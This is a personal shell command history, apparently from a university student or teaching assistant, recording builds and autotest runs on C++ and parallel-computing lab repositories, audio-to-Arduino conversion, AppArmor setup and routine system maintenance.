-python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 960 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 960 --max-size 1920
-python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 60 --max-size 1920
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 60 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 48
-v audio_to_arduino.py
-python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 512
-v audio_to_arduino.py
-python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 512
-python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 512
-python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 512
-source venv/bin/activate
-v audio_to_arduino.py
-python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 60 --max-size 512
-python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 120 --max-size 512
-python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 20 --max-size 512
-python audio_to_arduino.py ~/Downloads/cat-meow-14536.mp3 --tempo 240 --max-size 1024
-python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 240 --max-size 1024
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 240 --max-size 1024
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 240 --max-size 1024
-python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
-j ucu cpp
-ls
-cd lab1-ratio-zaletskyi_husiev
-ls
-git pull
-python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
-v src/QTheStubborn.cpp
-python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
-python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
-python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
-python audio_to_arduino.py ~/Downloads/meow-meow-sad-made-with-Voicemod.mp3 --tempo 120 --max-size 48
-j ucu cpp
-cd lab1-ratio-zaletskyi_husiev
-git pull
-v src/QTheStubborn.cpp
-./compile.sh -d
-./compile.sh -d
-v CMakeLists.txt
-./compile.sh -d
-./bin/ratio_the_stubborn
-git add .
-git commit -m "Prettify"
-git push
-v README.md
-j ucu acs
-ls
-j ucu
-cd acs
-ls
-cd lab11-mpi-opyr-husiev
-v readme.md
-v README.md
-git add .
-git commit -m "Add readme with todos"
-git push
-j ucu cpp
-ls
-j sec
-cd ../sec
-ls
-cd lab1
-ls
-v poc/cve_2019_3924/src/main.cpp
-j sec
-v R
-cd lab1
-v README.md
-у�лву�к еу�з
-mkdir tmp
-cd tmp
-git clone git@github.com:ucu-cs/lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi --depth=1
-cd lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
-ls
-cd ..
-\rm -r lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
-\rm -rf lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
-git clone git@github.com:ucu-cs/lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi --recursive
-cd lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
-ls
-cd ..
-\rm -rf lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
-git clone git@github.com:ucu-cs/lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi --recursive --depth=2
-cd lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
-ls
-cd ..
-\rm -rf lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
-git clone git@github.com:ucu-cs/lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi --recursive --depth=2
-cd lab3-parallel-integral-valihursyi_shtohryn_tarnavskyi
-ls
-ls tomlplusplus
-ls
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/integral/test_integral.py .
-python test_integral.py parallel
-j cpp lab1
-ls
-git pull
-v src/main.cpp
-git add .
-git commit -m "Format"
-v README.md
-j ucu
-ls
-ranger
-./compile.sh -d
-v src/main.cpp
-./compile.sh -d
-./compile.sh -d
-./compile.sh -d
-ls
-cppbuild cpplab1
-cppcompile cpplab1 -p
-ls bin
-./bin/clang-asan
-./bin/clang-ubsan
-./bin/clang-msan
-\rm bin/*
-ls
-git add .
-git commit -m "Make it a static library"
-git add .
-git commit -m "Remove commented code"
-./compile.sh -d
-./bin/ratio_the_stubborn
-./compile.sh -d
-./bin/ratio_the_stubborn
-./compile.sh -d
-./bin/ratio_the_stubborn
-./compile.sh -d
-./bin/ratio_the_stubborn
-./compile.sh -d
-./bin/ratio_the_stubborn
-./compile.sh -d
-./bin/ratio_the_stubborn
-./compile.sh -d
-./bin/ratio_the_stubborn
-./compile.sh -d
-./bin/ratio_the_stubborn
-./compile.sh -d
-./bin/ratio_the_stubborn
-git add .
-git diff
-git diff HEAD
-git commit -m "Stylistic changes (e.g. change to <=>)"
-git push
-./bin/ratio_the_stubborn
-git add .
-git commit -m "Finish readme"
-git push
-./compile.sh -d
-./bin/ratio_the_stubborn
-git add .
-git commit -m "Add examples of nan and inf"
-git push
-cppcompile cpplab1 -p
-cppbuild cpplab1
-cppcompile cpplab1 -p
-cppbuild cpplab1
-cppcompile cpplab1 -p
-cppcompile cpplab1 -p
-./bin/ratio_the_stubborn
-git diff
-j lab4
-v include/timer.hpp
-./compile.sh -o
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./bin/productivity_test
-./bin/productivity_test
-./compile.sh -o
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./bin/productivity_test
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./compile.sh -o
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-git status
-git add .
-git commit -m "Add a simple performace test"
-git push
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-git add .
-git commit -m "Add perf test to readme"
-git push
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./compile.sh -o
-./bin/productivity_test
-./bin/productivity_test
-git add .
-git commit -m "Add perf test with uncancelled"
-git push
-d kwin_wayland --replace
-j sec
-ls
-cd lab1
-ls
-ls poc
-ls poc/cve_2019_3924
-v README.md
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-yay --noconfirm
-v Downloads/lab1/README.md
-\rm -r Downloads/lab1
-\rm -rf Downloads/lab1
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/integral/test_integral.py .
-python test_integral.py tpool
-python test_integral.py tpool -C -s -k
-v CMakeLists.txt
-j cpp-
-ls
-v CMakeLists.txt
-cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
-cppbuild lab5check1
-cppcompile lab5check1 -p
-./bin/clang-asan 3 func3.cfg
-./bin/clang-asan 3 func3.cfg 3 7
-./bin/clang-msan 3 func3.cfg 3 7
-./bin/clang-ubsan 3 func3.cfg 3 7
-./bin/clang-tsan 3 func3.cfg 3 7
-cppcompile lab5check1 --s="3 func3.cfg 3 7"
-v functions.cpp
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-yay --noconfirm
-j pri
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-convim
-nvim -v
-convim
-v temp/py.py
-killall lua-language-server
-killall lua-language-server
-v temp/py.py
-convim
-killall lua-language-server
-convim
-convim
-v temp/py.py
-v temp/py.py
-v temp/py.py
-killall lua-language-server
-v
-convim
-killall lua-language-server
-convim
-convim
-convim
-v temp/py.py
-convim
-convim
-v .config/nvim/init_code.lua
-v .config/nvim/init_code.lua
-convim
-convim
-convim
-v .config/alacritty/alacritty.toml
-alacritty -e zsh
-yay kitty
-kitty
-kitty
-showkey -a
-v
-showkey -a
-v temp/py.py
-convim
-v temp/cpp.cpp
-convim
-v
-v
-v
-v
-v
-v
-v
-v
-v
-v
-v
-sudo systemctl enable apparmor
-yay apparmor
-v dotfiles/scripts/install_arch.sh
-sudo systemctl enable apparmor
-sudo systemctl start apparmor
-sudoedit /etc/default/grub
-sudoedit /etc/dracut.conf.d/resume.conf
-sudoedit /etc/dracut.conf.d/eos-defaults.conf
-sudoedit /etc/dracut.conf.d/resume.conf
-sudoedit /etc/dracut.conf.d/apparmor.conf
-sudo dracut --force
-ls /boot/loader/entries/
-sudoedit /boot/initramfs-linux.img
-ls /efi
-sudo ls /efi
-sudo ls /efi/loader
-sudo ls /efi/loader/entries
-sudo ls /efi/loader/entries/9852361fabc94a829aa95cf2b0f29a55-6.13.8-arch1-1.conf
-sudoedit /efi/loader/entries/9852361fabc94a829aa95cf2b0f29a55-6.13.8-arch1-1.conf
-cat /sys/kernel/security/lsm
-zgrep CONFIG_LSM= /proc/config.gz
-sudoedit /etc/dracut.conf.d/apparmor.conf
-sudo systemctl status apparmor
-sudoedit /etc/dracut.conf.d/apparmor.conf
-sudo rm -r /etc/dracut.conf.d/apparmor.conf
-sudoedit /etc/dracut.conf
-sudoedit /etc/dracut.conf.d/calamares-luks.conf
-sudoedit /etc/dracut.conf.d/eos-defaults.conf
-sudoedit /etc/dracut.conf.d/resume.conf
-sudo dracut --force
-sudo reboot
-yay -Rns apparmor
-v dotfiles/scripts/install_arch.sh
-sudo pacman -S apparmor
-v dotfiles/scripts/install_arch.sh
-sudoedit /etc/dracut.conf.d/apparmor.conf
-v dotfiles/scripts/install_arch.sh
-sudoedit /etc/dracut.conf.d/apparmor.conf
-sudo dracut --hostonly --no-hostonly-cmdline --force /boot/initramfs-linux.img
-ls /etc/apparmor.d
-sudoedit /etc/dracut.conf.d/apparmor.conf
-sudo dracut --hostonly --no-hostonly-cmdline --force /boot/initramfs-linux.img
-sudo systemctl enable apparmor.service
-sudo systemctl status apparmor
-sudoedit /etc/dracut.conf.d/apparmor.conf
-sudo systemctl start apparmor
-sudo systemctl status apparmor
-v dotfiles/scripts/install_arch.sh
-aa-status
-sudo systemctl status auditd
-sudo systemctl enable auditd
-sudo systemctl status auditd
-sudo systemctl start auditd
-sudo systemctl status auditd
-sudo systemctl status apparmor
-sudoedit /etc/dracut.conf.d/apparmor.conf
-sudo systemctl status apparmor
-aa-status
-sudoedit /etc/dracut.conf.d/apparmor.conf
-sudo rm /etc/dracut.conf.d/apparmor.conf
-sudoedit /etc/kernel/cmdline
-sudo dracut --hostonly --no-hostonly-cmdline --force /boot/initramfs-linux.img
-aa-status
-sudo systemctl status apparmor
-sudoedit /etc/kernel/cmdline
-sudo dracut --hostonly --no-hostonly-cmdline --force /boot/initramfs-linux.img
-aa-status
-sudo systemctl status apparmor
-v dotfiles/scripts/install_arch.sh
-yay -Rns apparmor
-sudoedit /etc/kernel/cmdline
-sudo dracut --hostonly --no-hostonly-cmdline --force /boot/initramfs-linux.img
-ping duck.com
-setarch -R -h
-mount -t -h
-mount -t
-mount -h
-lsof -h
-j pri
-ssh -i id_ed25519 dedicated_persevere@185.130.46.132
-ping duck.com
-ping learn.ucu.edu.ua
-ping learn.ucu.edu.ua
-ping learn.ucu.edu.ua
-ping learn.ucu.edu.ua
-yay folly
-cd Downloads
-ls
-v process.py
-\rm process*
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-yay --noconfirm
-flatpak --user update -y && flatpak update -y && tldr --update
-j acs ass
-ls
-cd ..
-ls
-cd lab7-words-kovalchuk_husiev_zaletskyi
-ls
-j lab8
-j acs
-ls
-cd lab8-words-parallel
-ls
-ls results
-ls results
-diff results/res_a.txt ../lab8-words-parallel/results/res_a.txt
-diff results/res_n.txt ../lab8-words-parallel/results/res_n.txt
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/integral/test_integral.py .
-v test_integral.py
-v test_integral.py
-j autot
-j UCU
-cd acs
-cd assistance
-cd UCU_autotests
-ls
-cd acs
-ls
-cd words_count
-ls
-v words
-v words.sh
-killall nextcloud
-ls
-ls words_count_testcases
-v words_count_testcases/test_0
-v words_count_testcases/test_0.m4
-v words_count_testcases/test_0.m4
-v test.sh
-git clone git@github.com:ucu-cs/lab3-parallel-integral-hrynda_pavlosiuk_denysova.git
-cd lab3-parallel-integral-hrynda_pavlosiuk_denysova
-ls
-v CMakeLists.txt
-cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
-cppbuild lab3check
-cppcompile lab3check -p
-v CMakeLists.txt
-cppcompile lab3check -p
-v CMakeLists.txt
-v CMakeLists.txt
-cppcompile lab3check -p
-j lab4
-v CMakeLists.txt
-v CMakeLists.txt
-cppcompile lab3check -p
-v CMakeLists.txt
-j lab4
-v CMakeLists.txt
-cppcompile lab3check -p
-v CMakeLists.txt
-cppcompile lab3check -p
-j cpp-
-v cpp-compile.Dockerfile
-v CMakeLists.txt
-j cpp-
-v CMakeLists.txt
-cppbuild lab3check
-cppcompile lab3check -p
-cppcompile lab3check -c -p
-cd ..
-\rm -r lab3-parallel-integral-hrynda_pavlosiuk_denysova
-\rm -rf lab3-parallel-integral-hrynda_pavlosiuk_denysova
-git clone git@github.com:ucu-cs/lab4_parallel_integral_queue-hrynda_pavlosiuk_denysova.git
-git clone git@github.com:ucu-cs/lab4-parallel-integral-queue-hrynda_pavlosiuk_denysova.git
-git clone git@github.com:ucu-cs/lab4-parallel-integral-queue_hrynda_pavlosiuk_denysova.git
-git clone git@github.com:ucu-cs/lab4-queue-integral-hrynda_pavlosiuk_denysova.git
-cd lab4-queue-integral-hrynda_pavlosiuk_denysova
-cp ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/integral/test_integral.py .
-python test_integral.py queue -h
-python test_integral.py queue -C -s
-python test_integral.py queue -C -s
-python test_integral.py queue -C -s
-mv test_integral.py test_words.py
-v test_words.py
-pwd | wl-copy
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py ../generic_test.py
-python test_words.py
-python test_words.py serial
-v test_words.py
-v ../integral/test_integral.py
-o .
-v to_bin.py
-python to_bin.py test1.zip
-python to_bin.py test1.zip | wl-copy
-j acs
-ls
-cd lab7
-cd lab7-words-kovalchuk_husiev_zaletskyi
-ls
-v test_words.py
-v configurations/configuration.cfg
-python to_bin.py test1.zip | wl-copy
-v to_bin.py
-python to_bin.py test1.zip | wl-copy
-j lab4
-j lab8
-cd ../lab7-words-kovalchuk_husiev_zaletskyi
-ls
-v test_words.py
-python test_words.py serial
-ls
-python test_words.py serial -p
-ls
-ls tests-build
-ls tests-build/__tests__
-ls tests-build/__tests__/1
-python test_words.py serial -p
-ls
-ls __tests__
-ls __tests__/test_num_1
-ls __tests__/test_num_1/test1
-ls __tests__/test_num_1/test1/d1
-ls __tests__/test_num_1/test1/d2
-python test_words.py serial -c
-ls
-python test_words.py serial -p
-python test_words.py serial -c
-python test_words.py serial -p
-python test_words.py serial -p
-python test_words.py serial -c
-python test_words.py serial -c
-python test_words.py serial -c
-j integ
-j integ
-j ass int
-j assi int
-j assi
-cd UCU_autotests
-cd acs
-cd integral
-ls
-v test_integral.py
-ls
-python test_words.py serial
-python test_words.py serial -p
-python test_words.py serial -p
-python test_words.py serial -p
-python test_words.py serial -p
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-ls
-python test_words.py serial -c
-ls
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-ls
-python test_words.py serial -p
-ls
-ranger __tests__
-o .
-j lab7
-ls
-pwd | wl-copy
-cd Downloads
-ls
-unzip lab7-words-count-unicode-opyr-master.zip
-\rm lab7-words-count-unicode-opyr-master.zip
-cd lab7-words-count-unicode-opyr-master
-ls
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py serial
-python test_words.py serial -p
-\rm -r __tests__
-python test_words.py serial
-v test_words.py
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-python test_words.py serial
-v src/main.cpp
-python test_words.py serial
-python test_words.py serial
-cd ../lab10-words-high-level
-ls
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py serial
-ls bin
-ls
-ls tests-build
-j acs
-ls
-cd exam-rhusiev
-ls
-v src/main.cpp
-j UCU_
-ls
-cd acs
-ls
-v generic_test.py
-cd ../lab7-words-kovalchuk_husiev_zaletskyi
-v test_words.py
-v CMakeLists.txt
-v test_words.py
-v test_words.py
-diff test_words.py ../lab7-words-kovalchuk_husiev_zaletskyi/test_words.py
-v test_words.py
-diff test_words.py ../lab7-words-kovalchuk_husiev_zaletskyi/test_words.py
-cp test_words.py ../lab7-words-kovalchuk_husiev_zaletskyi
-python test_words.py tbb
-ls
-v CMakeLists.txt
-ls cmake-build-tests
-\rm -r tests-build
-\rm cmake-build-tests -r
-ls
-ls bin
-./compile.sh -d
-yay tbb
-./compile.sh -d
-yay -R onetbb
-yay -R tbb
-yay -R intel-oneapi-tbb
-yay -R intel-oneapi-*
-yay -R 'intel-oneapi-*'
-yay -R intel-oneapi-tcm intel-oneapi-common
-v src/main.cpp
-./compile.sh -d
-v src/main.cpp
-./compile.sh -d
-v src/main.cpp
-./compile.sh -d
-./compile.sh -c
-python test_words.py tbb
-cp test_words.py ../lab10-words-high-level
-python test_words.py tbb
-v test_words.py
-cp test_words.py ../lab10-words-high-level
-python test_words.py tbb
-v test_words.py
-cp test_words.py ../lab10-words-high-level
-python test_words.py tbb
-v test_words.py
-python test_words.py tbb
-cp test_words.py ../lab10-words-high-level
-python test_words.py tbb
-v src/main.cpp
-python test_words.py tbb
-cp test_words.py ../lab10-words-high-level
-python test_words.py tbb
-cp test_words.py ../lab10-words-high-level
-python test_words.py tbb
-v src/main.cpp
-cp test_words.py ../lab10-words-high-level
-python test_words.py tbb
-python test_words.py tbb
-\rm test_words.py
-ls
-\rm -r cmake-build-tests
-cd ..
-cd lab8-words-parallel
-ls
-cp test_words.py ../lab8-words-parallel
-python test_words.py parallel
-v test_words.py
-cp test_words.py ../lab8-words-parallel
-python test_words.py parallel
-cp test_words.py ../lab8-words-parallel
-python test_words.py parallel
-cp test_words.py ../lab8-words-parallel
-python test_words.py parallel
-\rm -r cmake-build-tests
-\rm -r test_words.py
-cd ../lab9-words-other-tools
-cp test_words.py ../lab9-words-parallel
-python test_words.py parallel
-python test_words.py parallel
-ls
-\rm ../lab9-words-parallel
-cp test_words.py ../lab9-words-other-tools
-python test_words.py parallel
-ls bin
-ls cmake-build-tests
-./compile.sh -d
-v src/main.cpp
-./compile.sh -d
-./compile.sh -c
-python test_words.py parallel
-ls cmake-build-tests
-cp test_words.py ../lab9-words-other-tools
-cp test_words.py ../lab9-words-other-tools
-python test_words.py tools
-\rm test_words.py
-\rm cmake-build-tests -r
-cd ../lab7-words-kovalchuk_husiev_zaletskyi
-ls
-cp test_words.py ../lab7-words-other-tools
-\rm ../lab7-words-other-tools
-cp test_words.py ../lab7-words-kovalchuk_husiev_zaletskyi
-python test_words.py serial -c
-\rm -r tests-build
-ls
-python test_words.py serial -p
-o .
-j UCU_
-ls
-o .
-python to_bin.py test1.zip | wl-copy
-python test_words.py serial -p
-python test_words.py serial
-python test_words.py serial -p
-python test_words.py serial -p
-python test_words.py serial
-python test_words.py serial -p
-ls
-ls bin
-python test_words.py serial -c
-python test_words.py serial
-ls cmake-build-tests
-ls
-python test_words.py serial -p
-ls
-ls cmake-build-tests
-v src/main.cpp
-cd ../lab9-words-other-tools
-cp test_words.py ../lab9-words-other-tools
-python test_words.py tools
-cp test_words.py ../lab9-words-other-tools
-python test_words.py tools
-python test_words.py tools
-cp test_words.py ../lab9-words-other-tools
-python test_words.py tools
-cd Downloads/lab7-words-count-unicode-opyr-master/
-ls
-pwd | wl-copy
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py serial
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py serial
-\rm -r .config/Nextcloud/logs/*
-v test_words.py
-python test_words.py serial
-python test_words.py serial -p
-o .
-python to_bin.py test1.zip | wl-copy
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py serial -p
-python test_words.py serial -p
-ls
-cd ..
-git clone git@github.com:ucu-cs/lab7_word_count_parallel-beheni_seryvko.git
-cd lab7_word_count_parallel-beheni_seryvko
-ls
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py serial
-ls
-ls cmake-build-tests
-v CMakeLists.txt
-python test_words.py serial
-cd ,,
-cd ..
-\rm -r lab7-words-count-unicode-opyr-master
-git clone git@github.com:ucu-cs/lab6_word_count_sequential-beheni_seryvko.git
-cd lab6_word_count_sequential-beheni_seryvko
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py serial
-ls
-v readme.md
-o Indexing_Sequential_Seryvko_Beheni_Report.pdf
-ls data
-v data/config.cfg
-python test_words.py serial -p
-v data/config.cfg
-v data/config.cfg
-./compile.sh
-ls
-ls bin
-./bin/countwords_seq data/config.cfg
-v data/config.cfg
-./bin/countwords_seq data/config.cfg
-v src/parser.cpp
-python test_words.py tools
-python test_words.py tools -p
-v conf.cfg
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py tools -p
-ls
-\rm -r __tests__
-python test_words.py tools -p
-./bin/countwords_par_proftools conf.cfg
-ls
-v a
-v n
-\rm -r a n __tests__ test_words.py conf
-\rm -r a n __tests__ test_words.py conf.cfg
-\rm -r conf.cfg
-ls
-\rm -r cmake-build-tests
-cd ..
-ls
-cd lab10-words-high-level
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-ls
-v conf.cfg
-python test_words.py tools -p
-v conf.cfg
-python test_words.py tools -p
-ls
-./bin/countwords_par_tbb conf.cfg
-v conf.cfg
-./bin/countwords_par_tbb conf.cfg
-v
-ls
-ls __tests__
-ls __tests__/test_num_1
-ls __tests__/test_num_1/test1
-ranger __tests__
-v conf.cfg
-./bin/countwords_par_tbb conf.cfg
-ls
-\rm "'n\"'"
-o .
-ls
-v n
-v a
-v
-cd ..
-\rm -r lab6_word_count_sequential-beheni_seryvko
-\rm -fr lab6_word_count_sequential-beheni_seryvko
-git clone --recursive https://github.com/ucu-cs/lab7-words-count-unicode-sahaidak_muryn
-git clone --recursive git@github.com/ucu-cs/lab7-words-count-unicode-sahaidak_muryn.git
-git clone --recursive git@github.com:ucu-cs/lab7-words-count-unicode-sahaidak_muryn.git
-\rm -rf lab7_word_count_parallel-beheni_seryvko
-cd lab7-words-count-unicode-sahaidak_muryn
-ls
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py serial
-ls
-ls bin
-ls cmake-build-tests
-cd cmake-build-tests
-make
-cmake ..
-cmake --build .
-ls
-ls CMake
-ls CMakeFiles
-ls CMakeFiles/countwords_seq.dir
-ls CMakeFiles/countwords_seq.dir/src
-cd ..
-v CMakeLists.txt
-cd cmake-build-tests
-\rm -rf *
-ls
-cmake ..
-cmake --build .
-ls
-cd ..
-v CMakeLists.txt
-cd -
-cmake --install .
-\rm -rf *
-cmake -DCMAKE_BUILD_TYPE=Release -DINSTALL_PREFIX = /home/rad1an/Downloads/lab7-words-count-unicode-sahaidak_muryn/
-cmake -DCMAKE_BUILD_TYPE=Release -DINSTALL_PREFIX=/home/rad1an/Downloads/lab7-words-count-unicode-sahaidak_muryn/
-\rm -rf *
-cmake -DCMAKE_BUILD_TYPE=Release -DINSTALL_PREFIX=/home/rad1an/Downloads/lab7-words-count-unicode-sahaidak_muryn/
-cmake -DCMAKE_BUILD_TYPE=Release -DINSTALL_PREFIX=/home/rad1an/Downloads/lab7-words-count-unicode-sahaidak_muryn/ ..
-cmake --build .
-ls
-cmake --install .
-cd ..
-v CMakeLists.txt
-cd ..
-\rm -rf lab7-words-count-unicode-sahaidak_muryn
-git clone git@github.com:ucu-cs/lab7-words-count-unicode-kokhan_mozil_savorona.git
-cd lab7-words-count-unicode-kokhan_mozil_savorona
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py serial
-ls
-cd ..
-git clone --recursive git@github.com:ucu-cs/lab7-words-count-unicode-sahaidak_muryn.git
-cd lab7-words-count-unicode-kokhan_mozil_savorona
-v CMakeLists.txt
-cd ..
-cd lab7-words-count-unicode-sahaidak_muryn
-v CMakeLists.txt
-python test_words.py serial
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py serial
-v test_words.py
-v test_words.py
-v test_words.py
-v test_words.py
-python test_words.py serial
-python test_words.py serial -p
-v test_words.py
-python test_words.py serial -p
-python test_words.py serial
-v
-cd ../lab7-words-count-unicode-kokhan_mozil_savorona
-ls
-cp /drive/Projects/ucu/acs/lab7-words-kovalchuk_husiev_zaletskyi/test_words.py .
-python test_words.py serial
-ls
-ls cmake-build-tests
-v CMakeLists.txt
-mkdir build 
-cmake -DCMAKE_BUILD_TYPE=Release -DINSTALL_PREFIX=/home/rad1an/Downloads/lab7-words-count-unicode-kokhan_mozil_savorona ..
-ls
-cd build
-cmake -DCMAKE_BUILD_TYPE=Release -DINSTALL_PREFIX=/home/rad1an/Downloads/lab7-words-count-unicode-kokhan_mozil_savorona ..
-j cpp-
-v CMakeLists.txt
-v compile.sh
-cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=/home/rad1an/Downloads/lab7-words-count-unicode-kokhan_mozil_savorona ..
-cmake --build .
-cd .
-v ../include/ConfigParams.h
-cmake --build .
-ls
-cd ..
-python test_words.py serial
-python to_bin.py test1.zip | wl-copy
-diff test_words.py ~/Downloads/lab7-words-count-unicode-kokhan_mozil_savorona/test_words.py
-v test_words.py
-cp test_words.py ~/Downloads/lab7-words-count-unicode-kokhan_mozil_savorona
-cd ~/Downloads/lab7-words-count-unicode-kokhan_mozil_savorona
-v test_words.py
-python test_words.py serial
-v test_words.py
-python test_words.py serial
-ls -l
-python test_words.py serial
-python test_words.py serial
-cp test_words.py ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/
-cd ~/Drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/
-pwd | wl-copy
